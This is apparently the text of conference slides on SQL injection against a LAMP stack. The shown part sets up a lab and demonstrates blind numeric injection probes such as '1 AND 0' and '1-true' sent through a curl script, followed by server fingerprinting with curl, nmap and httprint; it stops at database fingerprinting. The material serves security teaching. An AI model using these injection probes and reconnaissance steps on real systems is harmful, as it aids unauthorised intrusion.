Hacking SQL Injection for Remote 
Code Execution on a LAMP stack.
Lance Buttars aka Nemus
Updated Slides @ 
https://www.introtobackdoors.com
Who am I?
Just some guy who likes computer security.
Twitter @Nemus801
I work as a PHP/Python application programmer.
I am a member of the local 
Defcon Group www.dc801.org 
Freenode #dc801.
I help organize and run 801 Labs which is a hackerspace 
located in downtown Salt Lake City.
801 Labs Hacker Space www.801labs.org 
Websecurity Warriors Podcast
http://websecuritywarriors.com/
Prerequisites
●
Familiarity with Linux, Apache, MySQL, PHP (LAMP).
○
Linux Operating Systems CLI
○
SQL Databases and Basic SQL
■
http://www.w3schools.com/sql/sql_intro.asp
○
Apache Servers.
○
Basic PHP knowledge.
○
Understanding of HTTP POST and GET
■
http://www.w3schools.com/tags/ref_httpmethods.asp
●
LAMP Setup 
○
https://www.digitalocean.
com/community/tutorials/how-to-install-linux-apache-
mysql-php-lamp-stack-on-ubuntu 
Why Study Attacks?
The best defense is a good offense. 
● By understanding how SQLi attacks work 
one can understand what to look for when 
they believe a web server has been 
compromised or tampered with.
● By studying attacks it becomes clear how to 
identify the weak points of a web 
application's overall architecture. 
What is SQL Injection?
SQL injection is a code injection technique 
used to attack an application by sending input 
from a user defined source that is later 
interpreted and executed by the SQL database. 
SQL injection attacks work because the input 
taken from the user input is combined unfiltered 
or filtered poorly with a SQL statements that is 
passed to the database that allows the form 
user to manipulate the query.
Scenario 
Through the point of view of an attacker this 
presentation will demonstrate the discovery of a 
SQLi vulnerability,  the damaging effect it can 
cause, and how an attacker could gain Remote 
Code Execution (RCE).
Steps 
1. Identify the vulnerability.
2. Fingerprint server.
3. Enumerate data from the database.
4. Upload a backdoor.
Lab Setup
Environment and Tools
For this attack a cURL script will be used to send malicious 
HTTP requests to a LAMP server. This will simulate a 
browser via command line. It should be noted that Burp 
Suite or Zed Attack Proxy Project could be used to do the 
same thing.
This will make running tests easier and allow for the quick 
generation of malicious urls needed to exploit the web 
server.
Curl Test Script 
#!/bin/bash
curl --get --data-urlencode "id=$1" "http://127.0.0.1/get.php"
http://curl.haxx.se/docs/manpage.html
-G, --get
●
When used, this option will make all data specified with -d, --data, --data-
binary or --data-urlencode to be used in an HTTP GET request.
--data-urlencode 
●
performs URL-encoding http://www.w3schools.com/tags/ref_urlencode.asp
root@testbox:/# ./get_curl.sh "1" 
http://127.0.0.1/get.php?id=1
PHP Architecture
Architecture 2
Test Database and Data
mysql> CREATE DATABASE orders;
mysql> USE ORDERS;
mysql> CREATE TABLE `orders` (
  `orderNumber` int(11) AUTO_INCREMENT,
  `productCode` varchar(15) NOT NULL,
  `quantityOrdered` int(11) NOT NULL,
  `priceEach` double NOT NULL,
  `orderLineNumber` smallint(6) NOT NULL,
  PRIMARY KEY (`orderNumber`)
) ENGINE=InnoDB;
mysql> INSERT INTO orders (productCode,quantityOrdered,priceEach,
orderLineNumber) 
values ('FAB232RT','30','20.00','1');
http://www.mysqltutorial.org/mysql-sample-database.aspx
Users Table
CREATE TABLE login(
id int(10) NOT NULL AUTO_INCREMENT,
username varchar(255) NOT NULL,
password varchar(255) NOT NULL,
email varchar(255) NOT NULL,
PRIMARY KEY (id)
);
-- login table with a couple of users using a md5 password
insert into login (username,password,email) values ('admin',md5
('monkey'),'PI:EMAIL');
insert into login (username,password,email) values ('admin',md5
('test'),'PI:EMAIL');
Vulnerable Code
Vulnerability Testing
So how does an attacker test for SQL 
injection?
Blind SQL Injection & Error Messages
●
Blind SQL Injection 
○
Blind SQL Injection is a type of an attack that runs valid queries on the 
database often using timing along with true or false parameters. The 
results from the timing attacks and the true or false evaluations can 
help determine if the system is vulnerable. This attack method is used 
when the web application is configured to NOT show generic error 
messages.t’
●
Error Message Based or Standard SQL Injection.
○
Is the opposite of a blind attack.
○
Using sql errors we extract data from the system error message.
○
Example:
■
Warning: mysql_fetch_array() expects parameter 1 to be 
resource, boolean given in
Methods of SQL Injection 
Strings
●
SELECT * FROM Table WHERE id = '1';
Numeric
●
SELECT * FROM Table WHERE id = 1;
Evaluation 
●
SELECT * FROM Users WHERE username = $user_name 
AND password = $Injection_point
○ If the query receives a result the code assumes the 
statement is true and returned data is used as 
validation.
Expand from http://websec.ca/kb/sql_injection
Demonstrated Methodology
● The following examples demonstrate 
blind testing which does not relying on 
error messages to build SQLi queries.
● In this scenario the testing will be done 
using numeric injection. The numeric 
injection can be inferred from the basis of 
the “id=1” variable being in the format of 
an integer. 
Numeric Injection Testing
# 1 AND 1 returns results. Which implies this is possibly vulnerable. 
root@testbox:/# ./get_curl.sh "1 AND 1" 
URL:http://127.0.0.1/get.php?id=1%20AND%201
SELECT * FROM orders where orderNumber =1 AND 1
Array( 
    [orderNumber] => 1
    [productCode] => ASDFB
…….
# 1 AND 0 returns no results.  Possibly vulnerable.
root@testbox:/# ./get_curl.sh "1 AND 0” 
URL:http://127.0.0.1/get.php?id=1%20AND%200
SELECT * FROM orders where orderNumber =1 AND 0
 # No returned results.
Numeric Injection Testing Continued
# 1 AND TRUE returns results. Which implies this is possibly vulnerable. 
root@testbox:/# ./get_curl.sh "1 AND True" 
URL:http://127.0.0.1/get.php?id=1%20AND%20true
SELECT * FROM orders where orderNumber =1 AND true
Array( 
    [orderNumber] => 1
    [productCode] => ASDFB
…….
# 1 AND FALSE returns no results. Possibly vulnerable.
root@testbox:/# ./get_curl.sh "1 AND false” 
URL:http://127.0.0.1/get.php?id=1%20AND%20false
SELECT * FROM orders where orderNumber =1 AND false
 # No returned results.
Numeric Injection Testing Continued
# 1-false returns 1 result if sql injection possibly vulnerable.
root@testbox:/# ./get_curl.sh "1-false" 
URL:http://127.0.0.1/get.php?id=1-false
SELECT * FROM orders where orderNumber =1-false
Array( 
    [orderNumber] => 1
    [productCode] => ASDFB
…….
# 1-true returns no results if sql injection vulnerability exists.
root@testbox:/# ./get_curl.sh "1-true"” 
URL:http://127.0.0.1/get.php?id=1-true
SELECT * FROM orders where orderNumber =1-true
 # No returned results.
Numeric Injection Testing Continued
# 1*3 returns 3 if sql injection vulnerability exists.
root@testbox:/# ./get_curl.sh "1*3" 
URL: http://127.0.0.1/get.php?id=1%2A3
SELECT * FROM orders where orderNumber =1*3
# 1*3 returns 1 if sql injection DOES NOT EXIST.
root@testbox:/# ./get_curl.sh "1*3” 
URL:http://127.0.0.1/get.php?id=1#todo fix this
SELECT * FROM orders where orderNumber =1
Array(
    [orderNumber] => 1
    [productCode] => ASDFB
    ….
Fingerprinting
So now that the attacker has identified the vulnerability the next step is to 
move on to understanding the system architecture.
Fingerprinting
● Knowing the system architecture aides the attacker on 
crafting specific SQL injection queries that later will be 
used to steal data. 
● Most web servers will identify their operating system 
and web technology in the HTTP request headers. 
○ Take note that these headers can be falsified and 
shouldn't be taken for granted
Looking at HTTP Headers
curl -v http://10.1.1.6/get.php?id=1
HTTP/1.1 200 OK
Date: Wed, 15 Oct 2014 07:30:38 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.5.17
Content-Length: 497
Connection: close
Content-Type: text/html; charset=UTF-8
nmap -sV -p 80 10.254.10.6
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS))
https://www.owasp.org/index.
php/Testing_for_Web_Application_Fingerprint_%28OWASP-IG-004%29
Nmap Scanning
[root@server1 ~]# nmap -A 127.0.0.1
80/tcp   open  http   
Apache httpd 2.2.15 ((CentOS))
http-methods: Potentially risky methods: TRACE
OS:SCAN(V=5.51%D=7/14%OT=22%CT=1%CU=37534%PV=N%DS=0%DC=L%G=Y%TM=55A4A611%P=
OS:x86_64-redhat-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=MFFD7ST11NW6%O2=MFFD7ST11NW6%O3=MFFD7NNT11NW6%O4=MFFD7ST11NW6%O5=MFF
OS:D7ST11NW6%O6=MFFD7ST11)WIN(W1=FFCB%W2=FFCB%W3=FFCB%W4=FFCB%W5=FFCB%W6=FF
OS:CB)ECN(R=Y%DF=Y%T=40%W=FFD7%O=MFFD7NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=
OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
OS:T=40%CD=S)
Verifying HTTP Via HTTP Print 
./httprint  -h 10.1.1.6 -s signatures.txt
http://net-square.com/httprint.html
Finger Printing Completed on http://10.1.1.6:80/
Host: 10.1.1.6
Derived Signature:
Apache/2.2.15 (CentOS)
9E431BC86ED3C295811C9DC5811C9DC5811C9DC5505FCFE84276E4BB811C9DC5
0D7645B5811C9DC5811C9DC5CD37187C11DDC7D7811C9DC5811C9DC58A91CF57
FCCC535B6ED3C295FCCC535B811C9DC5E2CE6927050C5D33E2CE6927811C9DC5
6ED3C295E2CE69262A200B4C6ED3C2956ED3C2956ED3C2956ED3C295E2CE6923
E2CE69236ED3C295811C9DC5E2CE6927E2CE6923
Banner Reported: Apache/2.2.15 (CentOS)
Banner Deduced: Apache/2.0.x
Score: 127
Confidence: 76.51
Database Fingerprinting
● Now that the attacker believes they know the web 